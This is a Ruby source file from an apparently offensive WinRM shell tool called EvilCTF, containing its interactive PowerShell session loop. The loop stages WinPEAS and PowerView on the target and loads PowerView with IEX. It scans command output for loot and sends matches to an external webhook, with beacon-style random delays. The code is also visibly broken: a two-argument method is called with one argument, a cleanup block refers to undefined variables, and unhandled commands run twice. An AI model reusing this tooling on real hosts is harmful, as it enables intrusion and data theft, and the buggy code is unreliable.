
# lib/evil_ctf/session.rb
require_relative 'shell_wrapper'
require_relative 'banner'
require_relative 'tools'
require_relative 'uploader' # loads EvilCTF::Uploader
require_relative 'enums'
require_relative 'sql_enum'
require_relative 'connection'
require_relative 'utils'
require_relative 'execution'
require_relative 'tui'
require_relative 'command_dispatcher'
require 'readline'
require 'timeout'
require 'evil_ctf/uploader'
require 'ipaddr'
require 'yaml'
require 'fileutils'

module EvilCTF::Session
  # Alias for the uploader helper
  Uploader = EvilCTF::Uploader

  # ------------------------------------------------------------------
  # Main session loop & command handling
  # ------------------------------------------------------------------
  def self.run_session(session_options)
    # Ensure reconnect_attempts is always an integer
    session_options[:reconnect_attempts] = session_options[:reconnect_attempts].to_i

    orig_ip = session_options[:ip]
    if orig_ip.match?(/:/)
      # Remove zone index if present (e.g., fd00::1%eth0)
      ipv6_addr = orig_ip.split('%')[0]
      host = "[#{ipv6_addr}]"
      add_ipv6_to_hosts(ipv6_addr)
    else
      host = normalize_host(orig_ip)
    end

    # Ensure port is set to WinRM default if missing or invalid
    if !session_options[:port] || session_options[:port].to_s.strip == '' || session_options[:port].to_i == 0
      session_options[:port] = session_options[:ssl] ? 5986 : 5985
    end

    scheme = session_options[:ssl] ? 'https' : 'http'
    endpoint = "#{scheme}://#{host}:#{session_options[:port]}/wsman"
    session_options[:endpoint] = endpoint
    EvilCTF::ShellWrapper.socksify!(session_options[:proxy]) if session_options[:proxy]
    puts "[*] Testing connection to #{orig_ip} (using #{host} in endpoint...)"

    # --- Session Logging Setup ---
    session_logfile = nil
    if session_options[:log_session]
      log_dir = File.expand_path('../../log', __dir__)
      FileUtils.mkdir_p(log_dir)
      ts = Time.now.strftime('%Y%m%d-%H%M%S')
      ip_or_host = (session_options[:ip] || 'unknown').gsub(/[^\w\.-]/, '_')
      session_logfile = File.join(log_dir, "session-#{ip_or_host}-#{ts}.log")
      session_options[:session_logfile] = session_logfile
      File.open(session_logfile, 'a') do |f|
        f.puts "=== EvilCTF Session Log ==="
        f.puts "Host: #{session_options[:ip]}"
        f.puts "User: #{session_options[:user]}"
        f.puts "Started: #{Time.now}"
        f.puts "==========================="
      end
    end

    # Centralized connection creation
    conn = EvilCTF::Connection.build_full(
      endpoint: endpoint,
      user: session_options[:user],
      password: session_options[:password],
      hash: session_options[:hash],
      kerberos: session_options[:kerberos],
      realm: session_options[:realm],
      keytab: session_options[:keytab],
      ssl: session_options[:ssl],
      debug: session_options[:debug],
      transport: session_options[:transport],
      user_agent: session_options[:user_agent]
    )
    unless conn
      puts "[!] ERROR - Could not create WinRM connection. Check your options and try again."
      return [false, { ok: false, error: 'Could not create connection' }]
    end

    # Validate connection and capture validation info
    validation_info = nil
    begin
      validation_info = EvilCTF::ConnectionValidator.validate(conn, timeout: 10)
      if validation_info[:ok]
        puts "[+] Connection validated: #{validation_info[:hostname]}"
      else
        puts "[!] Connection validation failed: #{validation_info[:error]}"
      end
    rescue => e
      validation_info = { ok: false, hostname: nil, error: "Validation error: #{e.message}" }
    end

    shell = nil
    begin
      shell = conn.shell(:powershell)
      logger = SessionLogger.new(session_options[:logfile])
      history = CommandHistory.new
      command_manager = EvilCTF::Tools::CommandManager.new

      shell.run(%q{
        function prompt { "PS $pwd> " }
        Set-Alias __exit__ Exit-PSSession
      })

      puts "[+] Connected to #{orig_ip}"

      banner_mode = session_options[:banner_mode] || :minimal
      if EvilCTF::Banner.respond_to?(:show_banner)
        EvilCTF::Banner.show_banner(shell, session_options, mode: banner_mode, no_color: false)
      else
        EvilCTF::Banner.show_banner_with_flagscan(shell, session_options)
      end

      setup_autocomplete(history)
      enum_cache = {}

      # If the user requested the TTY-based UI, hand off control to the
      # TUI renderer which will perform its own background polling and
      # interactive handling. After the TUI exits we perform normal
      # session cleanup and return.
      if session_options[:tui]
        begin
          puts "[*] Launching TUI..."
          EvilCTF::TUI.start_rainfrog(shell, session_options)
        rescue => e
          puts "[!] Failed to start TUI: #{e.class}: #{e.message}"
        ensure
          EvilCTF::ShellWrapper.exit_session(shell) if defined?(EvilCTF::ShellWrapper.exit_session)
          shell.close if shell
        end
        return [true, validation_info]
      end

      # Enumeration presets
      if session_options[:enum]
        puts "[*] Running enumeration preset: #{session_options[:enum]}"
        case session_options[:enum]
        when 'deep'
          EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
        when 'dom'
          EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
          EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 60)
        when 'sql'
          EvilCTF::SQLEnum.run_sql_enum(shell)
        else
          EvilCTF::Enums.run_enumeration(shell, type: session_options[:enum], cache: enum_cache,
                                         fresh: session_options[:fresh])
        end
      end

      puts "Type 'help' for commands, '__exit__' or 'exit' to quit, or !bash for local shell.\n\n"

      should_exit = false

      loop do
        # Check global flag at the top of loop (set by Signal.trap in main)
        last_command_was_tool_upload = false
        if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
          should_exit = true
        end
        break if should_exit

        begin
          Timeout.timeout(1800) do
            prompt = shell.run('prompt').output
            # Use a non-blocking approach for readline to allow interrupt detection
            input = nil

            # Create a thread to read input with timeout
            input_thread = Thread.new do
              begin
                input = Readline.readline(prompt, true)
              rescue Interrupt
                # Handle interrupt in the reading thread
                $evil_ctf_should_exit = true
                should_exit = true
                return
              end
            end

            # Wait for input or timeout (with short interval to check exit flag)
            while !input_thread.join(0.1) && !should_exit
              if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
                should_exit = true
                break
              end
            end

            # If thread completed, get the input
            if input_thread.alive?
              input_thread.join
            else
              input = input_thread.value
            end

            # Check exit flag after reading input but before processing
            if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
              should_exit = true
              next
            end

            break if input.nil?

            input = input.strip
            next if input.empty?

            # Clean exit commands: set flag, let outer loop handle break
            if input =~ /^(exit|quit|__exit__)$/i
              should_exit = true
              next
            end

            history.add(input)

            # --- Session Logging: Log command ---
            if session_logfile
              File.open(session_logfile, 'a') do |f|
                f.puts "\n[#{Time.now.strftime('%Y-%m-%d %H:%M:%S')}] CMD: #{input}"
              end
            end

            # Command dispatch via dispatcher
            dispatch_result = EvilCTF::CommandDispatcher.dispatch(
              input, 
              input.split(/\s+/, 2)[1] || '',
              shell,
              session_options,
              command_manager,
              history
            )

            if dispatch_result[:handled]
              # Command was handled by dispatcher
              if dispatch_result[:ok]
                puts dispatch_result[:output] if dispatch_result[:output] && !dispatch_result[:output].empty?
              elsif dispatch_result[:error]
                puts "[!] #{dispatch_result[:error]}"
              end
            elsif dispatch_result[:ok]
              # Dispatch returned ok but no output
            else
              # Not handled by dispatcher - use legacy path for macros/aliases
              if command_manager.expand_macro(input, shell,
                                              webhook: session_options[:webhook])
                last_command_was_tool_upload = false
                next
              end

              cmd = command_manager.expand_alias(input)
              start = Time.now
              result = shell.run(cmd)
              elapsed = Time.now - start
              puts result.output
              # --- Session Logging: Log output ---
              if session_logfile
                File.open(session_logfile, 'a') do |f|
                  f.puts "[#{Time.now.strftime('%Y-%m-%d %H:%M:%S')}] OUT:"
                  f.puts result.output
                end
              end
              unless last_command_was_tool_upload
                matches = EvilCTF::Tools.grep_output(result.output)
                if matches.any?
                  EvilCTF::Tools.save_loot(matches)
                  EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
                end
              end
              last_command_was_tool_upload = false

              logger.log_command(cmd, result, elapsed,
                                 '$PID', result.exitcode || 0)
              sleep(rand(30..90)) if session_options[:beacon]
            end

              # Macro expansion

            if command_manager.expand_macro(input, shell,
                                            webhook: session_options[:webhook])
              last_command_was_tool_upload = false
              next
            end

            # Normal command path
            cmd = command_manager.expand_alias(input)
            start = Time.now
            result = shell.run(cmd)
            elapsed = Time.now - start
            puts result.output
            # --- Session Logging: Log output ---
            if session_logfile
              File.open(session_logfile, 'a') do |f|
                f.puts "[#{Time.now.strftime('%Y-%m-%d %H:%M:%S')}] OUT:"
                f.puts result.output
              end
            end
            unless last_command_was_tool_upload
              matches = EvilCTF::Tools.grep_output(result.output)
              if matches.any?
                EvilCTF::Tools.save_loot(matches)
                EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
              end
            end
            last_command_was_tool_upload = false

            logger.log_command(cmd, result, elapsed,
                               '$PID', result.exitcode || 0)
            sleep(rand(30..90)) if session_options[:beacon]
          end
        rescue Timeout::Error
          puts "\n[!] Idle timeout — closing session"
          should_exit = true
        rescue Interrupt
          puts "\n[!] Ctrl-C detected; exiting."
          $evil_ctf_should_exit = true
          should_exit = true
        rescue => e
          # Handle connection errors gracefully
          if e.is_a?(WinRM::WinRMAuthorizationError) || (defined?(Net::HTTPServerException) && e.is_a?(Net::HTTPServerException))
            puts "[!] WARNING - Connection lost: #{e.message}"
            puts "  This may indicate: session timeout, network issues, or firewall changes"
            should_exit = true
          elsif defined?(WinRM::WinRMEndpointError) && e.is_a?(WinRM::WinRMEndpointError)
            puts "[!] WARNING - Connection failed: #{e.message}"
            puts "  This may indicate WinRM service not running or firewall blocking access"
          elsif defined?(WinRM::WinRMAuthenticationError) && e.is_a?(WinRM::WinRMAuthenticationError)
            puts "[!] WARNING - Authentication failed: #{e.message}"
            puts "  Check credentials or Kerberos configuration"
            should_exit = true
          elsif defined?(WinRM::WinRMTransportError) && e.is_a?(WinRM::WinRMTransportError)
            puts "[!] WARNING - Transport error: #{e.message}"
            puts "  Possible SSL/TLS or proxy issues"
          else
            puts "[!] WARNING - Session error: #{e.class}: #{e.message}"
          end

          # Check exit flag in error handler too:
          if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
            should_exit = true
          end

          # Safe reconnect logic with exit check:
          if session_options[:reconnect_attempts].to_i > 0 && !should_exit
            puts "[*] Attempting to reconnect (#{session_options[:reconnect_attempts]} attempts remaining)..."
            sleep(5)
            session_options[:reconnect_attempts] -= 1
            retry
          end
        end

        break if should_exit   # ensure outer loop exits
      end

      # Single exit path and single close
      EvilCTF::ShellWrapper.exit_session(shell) if defined?(EvilCTF::ShellWrapper.exit_session)
      shell.close if shell
    rescue => e
      # Enhanced error handling for connection creation failures
      puts "[!] WARNING - Failed to create PowerShell session: #{e.class}: #{e.message}"
      puts "  This may indicate: network issues, firewall blocking, WinRM misconfig, or auth problems"

      # Attempt to reconnect if possible
      if session_options[:reconnect_attempts].to_i > 0
        puts "[*] Attempting to reconnect (#{session_options[:reconnect_attempts]} attempts remaining)..."
        sleep(5)
        session_options[:reconnect_attempts] -= 1
        retry
      else
        puts "[!] Maximum reconnection attempts reached. Exiting."
        return [false, validation_info]
      end
    ensure
      # Ensure cleanup happens even on interruption or errors
      EvilCTF::ShellWrapper.exit_session(shell) if defined?(EvilCTF::ShellWrapper.exit_session)
      shell.close if shell
    end

    puts '[+] Session closed.'
    [true, validation_info]
  end

  # ------------------------------------------------------------------
  # Helper utilities
  # ------------------------------------------------------------------
  def self.normalize_host(host)
    begin
      ip_addr = IPAddr.new(host.split('%').first)
      ip_addr.ipv6? ? "[#{host.split('%')[0]}]" : host
    rescue IPAddr::InvalidAddressError
      host
    end
  end

  # ------------------------------------------------------------------
  # Add IPv6 and hostname mapping to /etc/hosts
  # ------------------------------------------------------------------
  def self.add_ipv6_to_hosts(ip, hostname)
    hosts_file = '/etc/hosts'
    entry = "#{ip} #{hostname}"
    
    begin
      # Check if already present
      if File.readlines(hosts_file).any? { |line| line.strip == entry }
        puts "[+] /etc/hosts already contains: #{entry}"
        return
      end
      # Backup hosts file
      backup = hosts_file + ".evilctf.bak"
      FileUtils.cp(hosts_file, backup) unless File.exist?(backup)
      # Append entry
      File.open(hosts_file, 'a') { |f| f.puts entry }
      puts "[+] /etc/hosts updated: #{entry}"
    rescue Errno::EACCES, Errno::EPERM => e
      puts "[!] WARNING: Unable to modify /etc/hosts (permissions required): #{e.message}"
      puts "[!] Try running with sudo: sudo -E ./evil-ctf [args]"
      puts "[!] Continuing session anyway..."
    rescue => e
      puts "[!] WARNING: Failed to update /etc/hosts: #{e.message}"
      puts "[!] Continuing session anyway..."
    end
  end

  def self.setup_autocomplete(history)
    Readline.completion_append_character = " "
    Readline.completion_proc = proc { |s| history.history.grep(/^#{Regexp.escape(s)}/) }
  end

  def self.parse_hosts_file(hosts_file)
    hosts = []
    return hosts unless File.exist?(hosts_file)
    File.readlines(hosts_file).each do |line|
      line.strip!
      next if line.empty? || line.start_with?('#')
      parts = line.split(':')
      if parts.size >= 3
        hosts << { ip: parts[0], user: parts[1], password: parts[2] || '', hash: parts[3] }
      else
        puts "[!] Invalid host line: #{line}"
      end
    ensure
      # Ensure we always try to clean up remote shell and connection resources
      begin
        shell.close if shell
      rescue => _e
        # best-effort cleanup
      end
      begin
        conn.reset if conn && conn.respond_to?(:reset)
      rescue => _e
      end
      begin
        logger.close if defined?(logger) && logger.respond_to?(:close)
      rescue => _e
      end
    end
    hosts
  end

  def self.load_config_profile(profile_name)
    profile_path = "profiles/#{profile_name}.yaml"
    unless File.exist?(profile_path)
      puts "[-] Profile not found: #{profile_path}"
      return {}
    end
    YAML.load_file(profile_path)
  rescue => e
    puts "[-] Failed to load profile: #{e.message}"
    {}
  end

  # ------------------------------------------------------------------
  # Logging helper
  # ------------------------------------------------------------------
  class SessionLogger
    def initialize(logfile = nil)
      @logfile = logfile
      @start = Time.now
      setup if @logfile
    end

    def setup
      FileUtils.mkdir_p(File.dirname(@logfile)) if @logfile && File.dirname(@logfile) != '.'
      File.open(@logfile, 'a') do |f|
        f.puts "=== Session started: #{@start} ==="
        f.puts
      end
    end

    def log_command(cmd, result, elapsed = nil, pid = nil, exit_code = nil)
      return unless @logfile
      File.open(@logfile, 'a') do |f|
        f.puts "[#{Time.now}] >> #{cmd}"
        f.puts result.output
        f.puts "[#{Time.now}] << Completed in #{elapsed&.round(2)}s | PID: #{pid} | Exit: #{exit_code}"
        f.puts
      end
    end
  end

  # ------------------------------------------------------------------
  # Command history helper
  # ------------------------------------------------------------------
  class CommandHistory
    def initialize
      @history = []
    end

    def add(cmd)
      @history << cmd
    end

    def show
      @history.each_with_index { |c, i| puts "#{i+1}: #{c}" }
    end

    def clear
      @history = []
    end

    def history
      @history
    end
  end
end
